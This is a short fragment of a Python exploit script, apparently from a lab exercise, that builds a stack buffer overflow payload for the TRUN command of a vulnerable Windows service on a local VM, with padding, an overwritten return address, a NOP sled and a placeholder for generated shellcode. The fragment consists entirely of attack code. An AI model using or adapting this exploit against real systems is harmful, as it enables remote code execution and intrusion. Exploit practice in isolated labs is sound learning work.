...
host="192.168.2.135" #IP of windows VM
port=9999 

#replace the generated payload below
buf =  ""
...
buffer = "TRUN /.:/" + "A" * 2003 + "\xcd\x73\xa3\x77" + "\x90" * 16 +  buf + "C" * (5060 - 2003 - 4 - 16 - len(buf)) #buffer to be modified
